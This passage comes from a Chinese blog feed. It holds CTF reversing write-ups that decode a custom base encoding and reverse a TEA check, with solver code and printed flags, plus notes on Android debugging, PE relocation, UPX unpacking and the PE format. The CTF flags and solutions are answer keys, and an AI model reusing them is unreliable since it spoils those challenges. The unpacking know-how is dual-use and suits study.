<span class="number">0x66</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x30</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, </span><br><span class="line">       <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x41</span>, <span class="number">0x41</span>] <span class="comment">#60个值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fox)):</span><br><span class="line">        <span class="keyword">if</span> (fox[i] == x):</span><br><span class="line">            <span class="keyword">return</span> i </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">60</span>,<span class="number">2</span>):</span><br><span class="line">    t = up(sng[i])+((up(sng[i+<span class="number">1</span>]))&lt;&lt;<span class="number">3</span>)</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_know_B@se_very_we11&#125;</span></span><br></pre></td></tr></table></figure><p>算法，c语言</p><hr><h2 id="find-flag">find_flag</h2><p>先看一下程序：发现会输入两次flag，不知道什么用意</p><p>还是用ida打开，在判断函数之前看到了加密函数根据1640531527可知这是一个TAE加密，但是由于知道有输入了两个flag先看看之前的flag1怎么样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_401AB0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !strnum )</span><br><span class="line">  &#123;</span><br><span class="line">    strnum = <span class="number">1</span>;</span><br><span class="line">    check1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">check1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (**pfunc)(<span class="type">void</span>); <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; bigq[i + <span class="number">1</span>]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    pfunc = (<span class="type">void</span> (**)(<span class="type">void</span>))&amp;bigq[i];</span><br><span class="line">    v1 = &amp;bigq[i - (<span class="type">unsigned</span> __int64)(i - <span class="number">1</span>) - <span class="number">1</span>];<span class="comment">//就是首元素</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      (*pfunc--)();</span><br><span class="line">    <span class="keyword">while</span> ( pfunc != (<span class="type">void</span> (**)(<span class="type">void</span>))v1 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401510((<span class="type">int</span> (__cdecl *)())sub_401A00);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到check1中有一个指向函数指针的指针这个指针指向了bigq的地址，而打开可以看到bigq的地址后面跟着两个函数的地址，所以当pfunc这个指针指向这个地址的时候，它解引用就是这个函数地址在(*pfunc–)();处调用并减小，可以把bigq当作一个函数指针数组</p><p>注意for后面有;所以只增加了i，后面不在循环里，所以相当于从后向前执行那两个函数,那么先看那两个函数，第一个调用的函数(这个是func2)是一个退出函数？？暂时不管。</p><p>打开func1：</p><p>看到很多数组,在读取时动态调试下断点,发现这里是真的检查处</p><p>真的检查函数是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">    sub_401550(&amp;flag1[<span class="number">2</span> * k]);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(flag1, &amp;v3[<span class="number">3</span>], <span class="number">0x28</span>ui64) )</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_401550</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> e; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> b2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> b1; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  b1 = *a1;</span><br><span class="line">  b2 = a1[<span class="number">1</span>];</span><br><span class="line">  e = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    e -= <span class="number">1640531527</span>;</span><br><span class="line">    b1 += (b2 + e) ^ (<span class="number">16</span> * b2 + <span class="number">137</span>) ^ ((b2 &gt;&gt; <span class="number">5</span>) + <span class="number">118</span>);</span><br><span class="line">    b2 += (b1 + e) ^ (<span class="number">16</span> * b1 + <span class="number">84</span>) ^ ((b1 &gt;&gt; <span class="number">5</span>) + <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = b1;</span><br><span class="line">  a1[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是一个TEA</p><p>注意此处读取前40个值且取test数组的第四位开始,而flag是char类型,后面转成unint类型,鉴于不好python和c大数计算有差别,所以用c写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        e -= <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x1f</span>; ++i) &#123;</span><br><span class="line">        b2 -= (b1 + e) ^ (<span class="number">16</span> * b1 + <span class="number">84</span>) ^ ((b1 &gt;&gt; <span class="number">5</span>) + <span class="number">50</span>);</span><br><span class="line">        b1 -= (b2 + e) ^ (<span class="number">16</span> * b2 + <span class="number">137</span>) ^ ((b2 &gt;&gt; <span class="number">5</span>) + <span class="number">118</span>);</span><br><span class="line">        e += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0x9F1F796B</span>, <span class="number">0xE4AF7378</span>, <span class="number">0x72FCDFD5</span>, <span class="number">0x4A57FFE0</span>, <span class="number">0x1672BA07</span>, <span class="number">0xAA057BE6</span>, <span class="number">0x9E171F8E</span>, <span class="number">0xDD153E4F</span>,</span><br><span class="line">    <span class="number">0x41079E59</span>, <span class="number">0x807578DD</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;data[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#X&quot;</span>, data[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0X67616C660X7730577B0X756F59210X6E31465F0X456D5F640X6F635F210X4072674E0X416C75740X6E6F31740X7D2173</span></span><br></pre></td></tr></table></figure><p>然后字符串转换:</p><p>666C61677B57307721596F755F46316E645F6D45215F636F4E67724074756C4174316F6E73217D</p><p>转string:flag{W0w!You_F1nd_mE!_coNgr@tulAt1ons!}</p><p>c语言，函数指针数组和指向函数指针数组的指针，TEA</p><h1>总结</h1><h2 id="RC4加密">RC4加密</h2><p>详见专栏：<a href="ed8aa7e2.html">RC4</a></p><h2 id="TAE加密">TAE加密</h2><p>详见专栏：<a href="d89283b5.html">TEA</a></p><h2 id="安卓调试流程">安卓调试流程</h2><blockquote><p>前置流程：</p><ol><li>先下载adb（部分模拟器自带adb，在模拟器根目录）</li><li>打开模拟器的root和开发者模式，在开发者模式里面开usb调试</li></ol><p>然后：</p><ol><li>用adb连接模拟器：adb connect 127.0.0.1：xxxxx（xxxxx根据模拟器而定），不要关闭</li><li>打开jadx的debug功能，顶上的<img src="https://s2.loli.net/2023/12/17/KGJzYeBwxroNOgR.png" alt="image-20231210140413425" style="zoom:33%;" />，然后应该能看到下面的设备出现了各种线程</li><li>找到对应进程，开始调试</li></ol></blockquote><h2 id="CE的mono功能">CE的mono功能</h2><p>mono是Novell开发的跨平台.NET运行环境,而Csharp是这个环境上的主要编程语言，Unity的使用的就是Csharp,所以CE的mono功能可以对大部分unity游戏使用</p><p>开启mono后，Ctrl+D打开反汇编程序窗口后可以直接看到类名和函数名，也可以在mono窗口查看DLL内容，相应类和方法，变量等，不仅可以方便写CElua脚本还能方便反编译器lispy或dnspy找DLL和方法名</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 杂题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》04-基址重定位表</title>
      <link href="/posts/8430b536.html"/>
      <url>/posts/8430b536.html</url>
      
        <content type="html"><![CDATA[<h1>基址重定位表</h1><h2 id="定义">定义</h2><p>PE重定位指如果PE文件加载时(一般是DLL,SYS动态加载)已经有别的DLL或SYS文件加载到它的ImageBase处，PE装载器会将其加载到其它未被占用的空间。<strong>PE装载器把它装载到其它位置的一系列行为</strong>就叫做PE重定位。(如果不进行这个操作,程序无法运行,内存地址引用错误)</p><blockquote><p>要解决什么问题呢?<br>–即让DLL文件能加载到其它地方并可以被正确调用.</p></blockquote><p>对于exe文件来说,exe每次都会加载到随机地址(ASLR机制)</p><h2 id="操作原理">操作原理</h2><ul><li>在程序中查找硬编码的地址位置(如指令指向的绝对地址)</li><li>读取值后,减去imagebase(VA-&gt;RVA)</li><li>加上实际加载的地址(RVA-&gt;VA)</li><li>注:这个是在加载时直接写入修改,而不是每次调用函数或指令时再计算</li></ul><p>那么,该如何查找硬编码地址呢?</p><h2 id="基址重定位表">基址重定位表</h2><p>基址重定位表记录了程序加载时需要修正的值的相关信息,包括修正地址的位置,需要修正的字节数,需要修正的地址类型等.在.reloc节中.位于PE头的DataDirectory数组的索引为5的元素指向了这个表.该表中每个记录都被称为<strong>一项</strong>(entry),每个项包含了需要修正的地址的详细信息.项以可变长度数组的形式存在<strong>重定位块</strong>中,每个重定位块是如下的IMAGE_BASE_RELOCATION结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">// 需要重定位的数据的RVA</span></span><br><span class="line">    DWORD SizeOfBlock;    <span class="comment">// 重定位块的长度(包括TypeOffset)</span></span><br><span class="line">    <span class="comment">//WORD TypeOffset[1];   // 重定位的偏移</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Offset:<span class="number">12</span>;  <span class="comment">// 大小为12Bit的重定位偏移 </span></span><br><span class="line">    WORD Type  :<span class="number">4</span>;   <span class="comment">// 大小为4Bit的重定位信息类型值 </span></span><br><span class="line">&#125;TypeOffset;         <span class="comment">// 这个结构体是A1Pass总结的</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每个IMAGE_BASE_RELOCATION结构体都表示一个重定位块,每块记录了0x1000页,记录方法是VirtualAddress表明基地址,每个TypeOffset的低12位表示偏移,基地址加偏移即是那个需要修改的地址.</p><p>其中SizeOfBlock的大小(块的长度)指明该重定位块中重定位项的个数</p><p>TypeOffset原则上不属于结构中,且元素个数 = （SizeOfBlock - 8 ）/ 2,其中前4位的部分含义:</p><blockquote><ul><li>[<code>IMAGE_REL_BASED_ABSOLUTE (0)</code>：使块按照32位对齐，位置为0]</li><li>[<code>IMAGE_REL_BASED_HIGH (1)</code>：高16位必须应用于偏移量所指高字16位]</li><li>[<code>IMAGE_REL_BASED_LOW (2)</code>：低16位必须应用于偏移量所指低字16位]</li><li>[<code>IMAGE_REL_BASED_HIGHLOW (3)</code>：全部32位应用于所有32位]</li><li>[<code>IMAGE_REL_BASED_HIGHADJ (4)</code>：需要32位，高16位位于偏移量，低16位位于下一个偏移量数组元素，组合为一个带符号数，加上32位的一个数，然后加上8000然后把高16位保存在偏移量的16位域内]。</li></ul></blockquote><p>数组的最后一项以NULL填充结尾.</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》03-手脱UPX</title>
      <link href="/posts/d011918c.html"/>
      <url>/posts/d011918c.html</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="UPX解码步骤">UPX解码步骤</h2><blockquote><p>1.先初始化<br>2.进行代码还原<br>3.进行CALL修复<br>4.进行函数表还原<br>5.节表初始化<br>6.解码完毕飞向程序入口</p></blockquote></blockquote><h2 id="方法">方法</h2><ul><li>单步跟踪法</li><li>ESP定律法</li></ul><h2 id="解释">解释</h2><p>单步跟踪法：基于UPX解压缩的步骤，ep开头会先push所有寄存器到栈，然后执行三个循环（见前一节），然后pop弹出所有寄存器后，重建表，进入程序oep。因此，只要一直f8，遇到循环就f4跳过，直到看到pop，然后跳过小循环，进入最后一个就，jmp即可进入oep，基于以上原理，由于upx解压部分和跳转都是连在一起的，所以直接alt+t搜索pop指令找到最后的位置(push对应pop,pusha或pushad对应popa和popad)</p><p>ESP定律法：根据原理push之后是解压，解压完为了跳回oep要获得之前的寄存器值即栈一定会平衡，开始时的栈和最后进入oep的栈状态相同，因此开始调试后先f8，使ESP(RSP)下浮一个值创建栈,如果之后的指令需要这时栈底的寄存器值,一定会回到这里读取这个值.然后复制这时栈顶的地址,G跳到那个地址,在这里下硬件断点,点f9后运行到硬件断点就是pop的位置之后的指令,然后如上即可.</p><h2 id="实例">实例</h2><h3 id="实例一-使用IDA">实例一(使用IDA)</h3><p>1,脱一个x64程序的UPX壳,使用ida:</p><p>初始对比:</p><img src="https://s2.loli.net/2023/12/13/rxZo9yn2kcEePSq.png" alt="a" /><p>可以看出加壳之后比源程序小了约四分之三.用ida打开加壳程序:</p><img src="https://s2.loli.net/2023/12/13/XcMx5TEzsZaekKR.png" alt="b" style="zoom:33%;" /><img src="https://s2.loli.net/2023/12/13/JVCxMTav3Pb5oqN.png" alt="c" style="zoom:33%;" /><p>可以看出,压缩后函数变得极少,可以作为判断是否有壳的方法.</p><p>在开始处点f2下断点并进行动态调试:</p><img src="https://s2.loli.net/2023/12/13/oKPZxGBQt1AvWXO.png" alt="d" style="zoom:33%;" /><img src="https://s2.loli.net/2023/12/13/h4OsAL3VNDYijWb.png" alt="e" style="zoom:80%;" /><p>f8单步调试并观察栈:</p><img src="https://s2.loli.net/2023/12/13/xmTjoiJuczEbXkH.png" alt="f" style="zoom:80%;" /><p>复制栈对应地址并g跳转然后下硬件断点:</p><img src="https://s2.loli.net/2023/12/13/fMiQDm8aeAJPIXC.png" alt="g" style="zoom:80%;" /><img src="https://s2.loli.net/2023/12/13/je9cyJPmXhFVCzp.png" alt="h" style="zoom:80%;" /><p>观察到栈已经下了断点,这时直接f9,弹出</p><img src="https://s2.loli.net/2023/12/13/gswat71T26xAXKQ.png" alt="i" style="zoom:50%;" /><p>跳转到</p><img src="https://s2.loli.net/2023/12/13/yS8JnoQ5D647LGu.png" alt="j" style="zoom:80%;" /><p>转换汇编视图可以发现</p><img src="https://s2.loli.net/2023/12/13/Q9LUcBgMjTPoqa5.png" alt="k" style="zoom:80%;" /><p>指针点击循环下面的位置点f4运行到对应位置,再几次f8进大跳转就进入oep了,这个地方注意要先把硬件断点删了,点击上面工具栏的断点列表del键删掉</p><h3 id="实例2-使用OD">实例2(使用OD)</h3><p>这是一个x32程序,使用od</p><p>进入后发现:</p><img src="https://s2.loli.net/2023/12/13/Q6BGY5ECRXzkfZV.png" alt="l" style="zoom:80%;" /><p>和上面方法一样,先f8,然后对寄存器下断点(右键sep值复制,在下面的命令窗口输入hr (对应的地址))这表示是硬件读取断点.回车</p><img src="https://s2.loli.net/2023/12/13/6UYmy4JF8NeqdDz.png" alt="m" style="zoom:80%;" /><p>然后直接f9,删掉硬件断点:调试-硬件断点-删除.就找到了pop,小循环,大跳转</p><img src="https://s2.loli.net/2023/12/13/ncliZFbTf6NDGtW.png" alt="n" style="zoom:80%;" /><p>之后与第一个写的相同</p><p>或者在开始的时候,ctrl+f搜索popad</p><img src="https://s2.loli.net/2023/12/13/umPHGU7vtcY5wEO.png" alt="o" style="zoom:80%;" /><p>然后找到对应位置:</p><img src="https://s2.loli.net/2023/12/13/XEZIDWQcYvMSk83.png" alt="p" style="zoom:80%;" /><p>然后直接f4即可</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 实践 </category>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 实践 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》02-运行时压缩器01</title>
      <link href="/posts/264d914b.html"/>
      <url>/posts/264d914b.html</url>
      
        <content type="html"><![CDATA[<h1>运行时压缩器</h1><p>定义：针对于PE文件而言，可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压后执行。</p><p>运行时压缩文件也是PE文件，含有原PE文件和解码程序。在程序的EP代码中执行解码程序，在程序入口（EP）处执行解码程序，同时在内存中解压缩后执行。</p><h2 id="1分类">1分类</h2><p>分为压缩器和保护器。</p><h3 id="1-1压缩器">1.1压缩器</h3><p>目的：</p><p>减小PE文件大小，便于传输和保存</p><p>隐藏PE文件内部代码和资源</p><h3 id="1-2保护器">1.2保护器</h3><p>目的：</p><p>保护PE文件免受代码逆向分析，应用多种防止代码逆向的技术（反调试，反模拟，代码混淆，多态代码，垃圾代码，调试器监视等）。压缩后比源文件大</p><p>防破解，保护代码与资源</p><h2 id="2UPX">2UPX</h2><p>一种压缩器，比较主流</p><h3 id="2-1压缩后特点">2.1压缩后特点</h3><ul><li>PE头和原来相同</li><li>节区名称改变(.text变为UPX0,.data变为UPX1)</li><li>第一个节区的RawDataSize=0(空节区)</li><li>EP在第二个节区</li><li>资源节区大小<code>几乎</code>无变化</li><li>入口点改变</li></ul><h3 id="2-2补充">2.2补充</h3><blockquote><p>为什么第一个节区是空节区</p><p>节区头中,第一个节区(UPX0)的RawDataSize为0,但是VirtualSize为10000.代码和数据都在UPX1中.UPX解压后,PE文件运行瞬间将解压的代码解压到第一个节区,解压结束后,运行源文件的EP代码.</p></blockquote><blockquote><p>入口点的变化</p><p>修改后，程序入口点EP到了UPX1的末端，而真实入口点OEP在EP之前。压缩后EP处指令为PUSHAD(和PUSHA相同)，是将EAX~EDI的值保存到栈，然后为MOV ESI,x，x是UPX0的起始地址</p></blockquote><h3 id="2-3UPX额外执行的操作">2.3UPX额外执行的操作</h3><ol><li>PUSHAD(和PUSHA相同)，将EAX~EDI的值压入栈</li><li>mov esi,x(或offset x),将x(一个地址,如果是offset则是x的地址)装入esi寄存器中,这是把UPX1的  起始地址放到ESI中</li><li>LEA EDI,DWORD PTR DS:[ESI+y]或lea edi, [esi-y]这个的作用是把UPX0的起始地址放到EDI中</li><li>PUSH EDI是把首地址入栈</li><li>解密循环:(从EDX中读取一个字节写入EDI??存疑)具体的解密算法按照加密来选择</li><li>解压缩循环:从ESI所指的UPX1中依次读值,经过LZMA解压缩填充到之前为NULL的EDI所指的UPX0中</li><li>重定位循环:把所有<code>基于地址的位置无关代码</code>(PIC)<a href="8430b536.html">重定位</a>,PIC是只使用相对位置的指令.如(CALL,JMP等),PIC在.data开头创建了全局偏移表(GOT)</li></ol><p>然后会进行IAT的建立。最后再开始执行源代码。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反静态分析 </category>
          
          <category> 压缩器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> 压缩器 </tag>
            
            <tag> 壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》01-PE文件结构</title>
      <link href="/posts/923a3c19.html"/>
      <url>/posts/923a3c19.html</url>
      
        <content type="html"><![CDATA[<h1>PE文件格式</h1><p>PE文件格式是Windows操作系统中的核心内容，学习PE文件格式可以理解可执行文件如何储存，如何进入内存被执行。</p><h3 id="PE文件定义">PE文件定义</h3><p>PE文件是windows操作系统下的可执行文件</p><p>其中32位的可执行文件称为PE或PE32，64位的被称为PE32+或PE+。</p><p>PE文件分为4种类型：</p><blockquote><p>可执行系列：.EXE  .SCR</p><p>库系列：.DLL  .OCX  .CPL  .DRV</p><p>驱动程序系列：.SYS  .VXD</p><p>对象文件系列：.OBJ（除了该项外，上面三种都可执行，</p><p>​      PE正式规范中OBJ文件也是PE文件）</p></blockquote><h3 id="PE文件结构">PE文件结构</h3><p>PE文件分为<strong>PE头</strong>和<strong>PE体</strong>，又可细分为DOS头，DOS存根，NT头，节区头（分别为.text,.data和.rsrc)然后是节区（分别为.text，.data和.rsrc节区）。text为代码区，data为数据区存放数据结构，rsrc为资源区，windows特有，存放应用程序资源。</p><p>每个节区前后存在<strong>NULL填充</strong>，即用00填充在节区头与节区，节区与节区之间，令文件或内存中节区的起始位置在各文件/内存最小单位的倍数上（这个值与NT头中的成员有关）。</p><p>PE头：PE头的构成是许多结构体（DOS头，DOS存根，NT头，节区头）。以下介绍结构体中的部分重要成员</p><hr><h4 id="1）DOS头">1）<strong>DOS头</strong></h4><ul><li>（IMAGE_DOS_HEADER)(19个成员)：</li><li>e_magic:dos签名：4D5A-&gt;MZ</li><li>e_lfanew(long):指向NT头的偏移（注意，这是long值，但是数据表明了从文件开头到NT头的偏移值，可以被用作指针.同时该值也是小端序储存）</li></ul><hr><h4 id="2-DOS存根：">2)<strong>DOS存根</strong>：</h4><p>​dos存根不是结构体，是存在于DOS头下方的一段命令与数据的混合，如果在dos环境下运行程序，会执行这里的指令。</p><hr><h4 id="3）NT头">3）<strong>NT头</strong></h4><ul><li><p>（IMAGE_NT_HEADERS)(三个成员)：</p></li><li><p>Signature(dword):签名：50450000h-&gt;&quot;PE&quot;00</p></li><li><p><code>FileHeader</code>(IMAGE_FILE_HEADER):文件头，是一个结构体</p><ul><li><p>Machine:每种类型的值表明能在哪种cpu上编译运行：14ch=x86,8664h=x64等等，但是并不是说32位的只能在32位系统上运行，现在有很多方法可以兼容运行。</p></li><li><p>NumberOfSelection:节区数量，一定大于0</p></li><li><p>SizeOfOpionalHeader:指出NT头中最后一个成员                               （IMAGE_OPTIONAL_HEADER32或64）的大小供系统查看</p></li><li><p>Characteristics（word):标识文件属性,每一位都代表一个属性，如0x0002表示这是可执行文件,0x1000表示是系统文件,0x2000表示这是dll文件</p></li><li><p>TimeDateStamp:标识编译时间</p></li></ul></li><li><p><code>OptionalHeader</code>(IMAGE_OPTIONAL_HEADER32OR64):可选头：</p><ul><li><p>Magic:可选头为32位时为10B,64位时为20B</p></li><li><p><em>AddressOfEnterPoint</em>:EP的rva值，指出起始代码地址</p></li><li><p>ImageBase:指出优先装入地址0~FFFFFFF，由于原位置可能已经加载了其它PE文件(主要是dll)</p></li><li><p>SectionAlignment,FileAlignment:指定节区在磁盘位置和内存储存的最小单位</p></li><li><p>SizeOfImage:指定image在虚拟内存中占的大小</p></li><li><p>SizeOfHeader:指出PE头的大小，应是SectionAlignment的整数倍</p></li><li><p>Subsystem:该值表示文件类型：1:驱动文件，2:窗口应用程序，3：控制台应用程序</p></li><li><p>NumberOfRvaAndSizes:该值指定下一个元素(DataDirectory)的元素个数,标准是16个(10h)</p></li><li><p>DataDirectory(结构体数组):重点是0和1和9，该项存了许多表</p></li></ul></li></ul><hr><h4 id="4）节区头">4）<code>节区头</code></h4><p>(节区头是由结构体组成的数组，每个结构体对应了一个节区)：</p><ul><li><p>IMAGE_SECTION_HEADER是结构体的类型，其中有部分重要成员：</p><ul><li><p>VirtualAdress（无值，已被可选头内容定义）</p></li><li><p><s>VirtulSize:内存中节区大小（无值，已被可选头内容定义）</s></p></li><li><p>VirtulSize:表明内存中节区的大小</p></li><li><p>SizeOfRawData:磁盘文件中节区大小</p><ul><li>VirtualSize与SizeOfRawData一般不同，说明<strong>磁盘文件中节区大小与加载到内存后的节区大小不同</strong>,若VirtualSize大于SizeOfRawData,节区剩余部分会被填充为0</li></ul></li><li><p>PointerToRawData:磁盘文件中节区起始位置（必须为FileAlignment的整倍数）</p></li><li><p>Characteristics:属性，由位或而来</p></li><li><p>Name:可以填入任何值，所以仅供参考不一定叫.code的区是.code区</p></li></ul></li></ul><hr><h3 id="PE文件的映射">PE文件的映射</h3><p><code>RVA(相对虚拟地址) to RAW(文件偏移)</code></p><p><code>RAW=RVA-VA+PointerToRawData</code></p><p>即：</p><p>首先找到节在内存中的偏移，然后找到RVA总偏移，取得相对偏移后加PointerToRawData（节的文件偏移）得到总文件偏移</p><h3 id="IAT和EAT">IAT和EAT</h3><h4 id="IAT">IAT:</h4><p>导入地址表</p><p>IMAGE_IMPORT_DESCRIPTOR(又叫IMPORT Directory Table):</p><img 